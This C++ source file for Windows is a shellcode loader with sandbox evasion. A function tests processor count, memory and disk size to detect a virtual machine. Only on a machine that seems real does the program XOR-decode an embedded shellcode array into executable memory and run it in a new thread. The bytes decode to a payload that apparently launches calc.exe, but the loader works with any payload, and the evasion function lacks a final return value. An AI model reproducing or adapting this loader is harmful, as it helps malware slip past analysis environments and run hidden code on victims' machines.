#include <iostream>
#include <Windows.h>

BOOL IsEnvReal() {
    SYSTEM_INFO systeminfo;
    GetSystemInfo(&systeminfo);
    DWORD numberOfProcessors = systeminfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) {
        return false;
    }
    MEMORYSTATUSEX memorystatus;
    memorystatus.dwLength = sizeof memorystatus;
    GlobalMemoryStatusEx(&memorystatus);
    DWORD RAMMB = memorystatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) {
        return false;
    }
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesreturned;
    
    DeviceIoControl(
        hDevice,
        IOCTL_DISK_GET_DRIVE_GEOMETRY,
        NULL,
        0,
        &pDiskGeometry,
        sizeof(pDiskGeometry),
        &bytesreturned,
        (LPOVERLAPPED)NULL
    );
    DWORD disksizeGB;
    disksizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (disksizeGB < 100) {
        return false;
    }

}


int main()
{
    if (!IsEnvReal()) {
         printf("(**) Virtual Environment found (**)");
    }
    else
    {
        const char shellcode[] =
            "\xc9\xdd\xb7\x35\x35\x35\x55\xbc\xd0\x04\xf5\x51\xbe\x65\x05\xbe"
            "\x67\x39\xbe\x67\x21\xbe\x47\x1d\x3a\x82\x7f\x13\x04\xca\x99\x09"
            "\x54\x49\x37\x19\x15\xf4\xfa\x38\x34\xf2\xd7\xc7\x67\x62\xbe\x67"
            "\x25\xbe\x7f\x09\xbe\x79\x24\x4d\xd6\x7d\x34\xe4\x64\xbe\x6c\x15"
            "\x34\xe6\xbe\x7c\x2d\xd6\x0f\x7c\xbe\x01\xbe\x34\xe3\x04\xca\x99"
            "\xf4\xfa\x38\x34\xf2\x0d\xd5\x40\xc3\x36\x48\xcd\x0e\x48\x11\x40"
            "\xd1\x6d\xbe\x6d\x11\x34\xe6\x53\xbe\x39\x7e\xbe\x6d\x29\x34\xe6"
            "\xbe\x31\xbe\x34\xe5\xbc\x71\x11\x11\x6e\x6e\x54\x6c\x6f\x64\xca"
            "\xd5\x6a\x6a\x6f\xbe\x27\xde\xb8\x68\x5f\x34\xb8\xb0\x87\x35\x35"
            "\x35\x65\x5d\x04\xbe\x5a\xb2\xca\xe0\x8e\xc5\x80\x97\x63\x5d\x93"
            "\xa0\x88\xa8\xca\xe0\x09\x33\x49\x3f\xb5\xce\xd5\x40\x30\x8e\x72"
            "\x26\x47\x5a\x5f\x35\x66\xca\xe0\x56\x54\x59\x56\x1b\x50\x4d\x50"
            "\x35";

        PVOID shellcode_exec = VirtualAlloc(NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
        DWORD ThreadID;
        for (int i = 0; i <= sizeof shellcode; i++) {
            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
        }
        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, NULL, &ThreadID);
        WaitForSingleObject(hThread, INFINITE);
    }

}
